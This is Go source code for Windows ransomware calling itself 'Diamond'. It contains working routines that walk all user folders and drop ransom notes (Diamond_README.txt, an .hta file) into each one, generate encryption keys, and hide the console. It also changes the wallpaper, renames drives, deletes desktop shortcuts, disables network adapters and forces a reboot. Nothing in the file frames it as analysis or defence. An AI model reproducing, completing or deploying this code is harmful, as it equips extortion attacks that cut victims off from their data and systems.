package main

import (
	// "bytes"

	"bufio"
	"context"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode"
	"unsafe"

	"github.com/google/uuid"
	// "github.com/yusufpapurcu/wmi"
	// "golang.org/x/sys/windows"
)

var (
	folderblacklist             = []string{"node modules", "__pycache__", ".gradle", ".nuget", "System Volume Information", "Program Files", "Riot Games", "VALORANT", "SteamLibrary", "FiveM", "ProgramData", "Program Files (x86)"}
	user32                      = syscall.NewLazyDLL("user32.dll")
	modadvapi32                 = syscall.NewLazyDLL("advapi32.dll")
	procGetUserName             = modadvapi32.NewProc("GetUserNameW")
	systemParametersInfo        = user32.NewProc("SystemParametersInfoW")
	size                 uint32 = 256
	done                        = 0
	buffer                      = make([]uint16, size)
	currentUser                 = GetUsername()
	importantNotePath           = fmt.Sprintf("C:\\Users\\%s\\AppData\\Local\\log.log", currentUser)
	last                 string = ""
)

const (
	SPI_SETDESKWALLPAPER = 0x0014
	SPIF_UPDATEINIFILE   = 0x01
	SPIF_SENDCHANGE      = 0x02
)

func GetUsername() string {

	ret, _, _ := procGetUserName.Call(
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(unsafe.Pointer(&size)),
	)

	if ret != 1 {
		panic("Failed to get username")
	}

	username := syscall.UTF16ToString(buffer) // Work on windows
	return username
}

func getDriversList() []string {
	var drivers []string

	driveLetters := "ABDEFGHIJKLMNOPQRSTUVWXYZ"
	for _, drive := range driveLetters {
		path := string(drive) + ":\\"
		driveinf, err := os.Stat(path)
		if err == nil && driveinf.Size() > 0 {
			drivers = append(drivers, filepath.VolumeName(path))
		}
	}

	return drivers
}

func paths(username string) []string {
	paths := []string{
		//fmt.Sprintf("C:\\Users\\%s\\Documents", username),
		//fmt.Sprintf("C:\\Users\\%s\\Desktop", username),
		//fmt.Sprintf("C:\\Users\\%s\\Pictures", username),
		//fmt.Sprintf("C:\\Users\\%s\\Music", username),
		//fmt.Sprintf("C:\\Users\\%s\\Videos", username),
		//fmt.Sprintf("C:\\Users\\%s\\Downloads", username),
		fmt.Sprintf("C:\\Users\\"),
	}

	return paths
}

// func getRandomInt64(min, max int64) int64 {
// 	return min + rand.Int63n(max-min+1)
// }

func generateEncryptionKey2() string {
	// Generate a UUID
	UUID2 := uuid.New().String()

	// Remove "-"
	key := strings.ReplaceAll(UUID2, "-", "")

	// Randomize characters of key
	runes := []rune(key)
	for i := len(runes) - 1; i > 0; i-- {
		j := rand.Intn(i + 1)
		runes[i], runes[j] = runes[j], runes[i]
	}
	key = string(runes)

	// Trim key to length 16
	if len(key) > 16 {
		key = key[:16]
	}

	return key
}

// func initAntiKill() {
// 	signals := make(chan os.Signal, 1)

// 	signal.Notify(signals,
// 		os.Interrupt, syscall.SIGINT, syscall.SIGQUIT,
// 		syscall.SIGTERM, syscall.SIGHUP, syscall.SIGPIPE,
// 		syscall.SIGSEGV, syscall.SIGTRAP)

// 	go func() {
// 		for sign := range signals {
// 			fmt.Println(sign)
// 			if sign == syscall.SIGTRAP {
// 				os.Exit(-1)
// 				return
// 			}

// 			signal.Ignore(sign)
// 			signal.Ignored(sign)
// 		}
// 	}()
// }

// func checkFileSize(filename string) bool {
// 	fileInfo, err := os.Stat(filename)
// 	if err != nil {
// 		return false
// 	}

// 	fileSize := fileInfo.Size()
// 	fileSizeInMB := fileSize / (1024 * 1024)

// 	return fileSizeInMB <= 20
// }

func RunCommand(command string, timeout time.Duration) {
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "cmd", "/c", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_ = cmd.Run()
}

// func MinimizeWindows() error {
// 	ole.CoInitialize(0)
// 	defer ole.CoUninitialize()

// 	unknown, err := oleutil.CreateObject("Shell.Application")
// 	if err != nil {
// 		return err
// 	}
// 	shell, err := unknown.QueryInterface(ole.IID_IDispatch)
// 	if err != nil {
// 		return err
// 	}
// 	oleutil.CallMethod(shell, "MinimizeAll")
// 	return nil
// }

func HConsole() {
	FindWindowA := user32.NewProc("FindWindowA")
	lpClassName := "ConsoleWindowClass"
	fromString, err := syscall.BytePtrFromString(lpClassName)
	if err != nil {
		os.Exit(0)
	}
	Stealth, _, _ := FindWindowA.Call(uintptr(unsafe.Pointer(fromString)), 0)
	ShowWindow := user32.NewProc("ShowWindow")
	_, _, _ = ShowWindow.Call(Stealth, 0)
}

func generateRandomString(length int) string {
	characters := "abcdefghijklmnopqrstuvwxyz"

	// Generate the random string
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = characters[rand.Intn(len(characters))]
	}

	return string(result)
}

func splitTasks(tasks []func() error, n int) [][]func() error {
	sublists := make([][]func() error, n)

	for i, task := range tasks {
		sublists[i%n] = append(sublists[i%n], task)
	}

	return sublists
}

func getFilesInFolders(folders []string, folderblacklist []string) ([]string, error) {
	var files []string

	for _, folder := range folders {
		if isItemListed(folder, folderblacklist) {
			continue
		}

		filepath.Walk(folder, func(path string, info os.FileInfo, err error) error {
			if err != nil {
				return nil
			}

			// if size was more than 300 MB
			sizeMB := info.Size() / (1024 * 1024)
			if sizeMB > 100 {
				if Verbose {
					fmt.Println(fmt.Sprintf("%s - %d MB", path, sizeMB))
				}
			}

			if info.IsDir() {
				// create a readme file for each folder and put note on it
				filename := fmt.Sprintf("%s\\Diamond_info.hta", path)
				file, err := os.Create(filename)
				if err != nil {
					return nil
				}
				_, _ = file.WriteString(NoteContentString)
				_ = file.Close()

				filename = fmt.Sprintf("%s\\Diamond_README.txt", path)
				file, err = os.Create(filename)
				if err != nil {
					return nil
				}
				_, _ = file.WriteString(Note)
				_ = file.Close()

				return nil
			}

			//ext := strings.ToLower(filepath.Ext(path))
			//if isItemListed(ext, blacklist) {
			//	return nil
			//}
			//if isItemListed(ext, whitelist) {
			//	files = append(files, path)
			//}
			files = append(files, path)

			return nil
		})
	}
	runtime.GC()

	return files, nil
}

// func isFolderBlacklisted(folder string, folderblacklist []string) bool {
// 	for _, blacklist := range folderblacklist {
// 		if strings.Contains(folder, blacklist) {
// 			return true
// 		}
// 	}
// 	return false
// }

func isItemListed(item string, list []string) bool {
	for _, format := range list {
		if item == format {
			return true
		}
	}
	return false
}

func isRunAsAdmin() bool {
	filePath := "C:\\Program Files (x86)\\" + generateRandomString(5) + ".txt"
	f, err := os.OpenFile(filePath, os.O_CREATE|os.O_RDWR|os.O_EXCL, 0755)
	if err != nil && !os.IsExist(err) {
		return false
	}
	defer func() {
		f.Close()
		_ = os.Remove(filePath)
	}()
	return true
}

func getWindowsEdition() int {
	cmd := exec.Command("systeminfo")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return 0
	}
	var edition string
	for _, edition = range strings.Split(string(out), "\n") {
		if strings.Contains(edition, "OS Name:") {
			break
		}
	}

	editionNumberStr := ""
	for _, char := range edition {
		if unicode.IsDigit(char) {
			editionNumberStr += string(char)
		}
	}
	editionNumber, _ := strconv.Atoi(editionNumberStr)

	return editionNumber
}

func RemoveDesktopShortcuts() {
	homeDir, _ := os.UserHomeDir()
	desktopPath := filepath.Join(homeDir, "Desktop")

	files, err := os.ReadDir(desktopPath)
	if err != nil {
		return
	}

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		if filepath.Ext(file.Name()) != ".lnk" {
			continue
		}

		os.Remove(filepath.Join(desktopPath, file.Name()))
	}
}

func GetWifiAdaptersName() []string {
	var adapters []string
	cmd := exec.Command("netsh", "interface", "show", "interface")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.Output()
	if err != nil {
		return nil
	}
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "Enabled") {
			adapters = append(adapters, strings.TrimSpace(strings.Split(line, " ")[len(strings.Split(line, " "))-1]))
		}
	}
	return adapters
}

func DisableAdapter(name string) error {
	cmd := exec.Command("netsh", "interface", "set", "interface", name, "disable")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	return err
}

func IsOnline() bool {
	conn, err := net.DialTimeout("tcp", "google.com:80", 10*time.Second)
	if err != nil {
		return false
	}
	defer conn.Close()

	return true
}

func HandleWallpaper() {
	// create a file with "filepath" path
	filePath := "C:\\Program Files (x86)\\" + generateRandomString(5) + ".png"

	f, err := os.Create(filePath)
	if err != nil {
		return
	}
	// write "ImageContent" to the file
	_, err = f.Write(ImageContent)
	if err != nil {
		return
	}

	// close the file
	err = f.Close()
	if err != nil {
		return
	}

	err = setWallpaper(filePath)
	if err != nil {
		return
	}
}

func HandleNotepad() (string, string) {
	// create a file with "filepath" path
	filePath := "C:\\Program Files (x86)\\" + generateRandomString(5) + ".hta"
	filePath2 := "C:\\Program Files (x86)\\" + generateRandomString(5) + ".txt"
	f, err := os.Create(filePath)
	if err != nil {
		return "", ""
	}
	defer f.Close()

	f2, err := os.Create(filePath2)
	if err != nil {
		return "", ""
	}
	defer f2.Close()

	// write "Note" to the file
	_, err = f.Write([]byte(NoteContentString))
	if err != nil {
		return "", ""
	}
	_, err = f2.Write([]byte(Note))
	if err != nil {
		return "", ""
	}

	return filePath, filePath2
}

func setWallpaper(path string) error {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	result, _, err := systemParametersInfo.Call(
		SPI_SETDESKWALLPAPER,
		0,
		uintptr(unsafe.Pointer(pathPtr)),
		SPIF_UPDATEINIFILE|SPIF_SENDCHANGE,
	)
	if result == 0 {
		return fmt.Errorf("SystemParametersInfo failed: %v", err)
	}
	return nil
}

func setVolumeName(drive string, name string) error {
	command := []string{"wmic", "LOGICALDISK", "WHERE", "Name='" + drive + "'", "SET", "VolumeName='" + name + "'"}
	cmd := exec.Command(fmt.Sprintf("C:\\Windows\\system32\\cmd.exe /C %s", strings.Join(command, " ")))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}

func RenameDrivers() {
	drivernames := getDriversList()
	for _, drivername := range drivernames {
		_ = setVolumeName(drivername, "Diamond")
	}
}

func Reboot() {
	RunCommand("shutdown /r /f /t 0", 10*time.Second)
}

func GetNetworkDrives() []string {
	cmd := exec.Command("net", "use")
	var drives []string
	output, err := cmd.Output()
	if err != nil {
		return nil
	}

	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix("OK", scanner.Text()) {
			fields := strings.Fields(line)
			if len(fields) > 1 {
				drives = append(drives, filepath.Join(fields[2], "\\"))
			}
		}
	}

	return drives
}
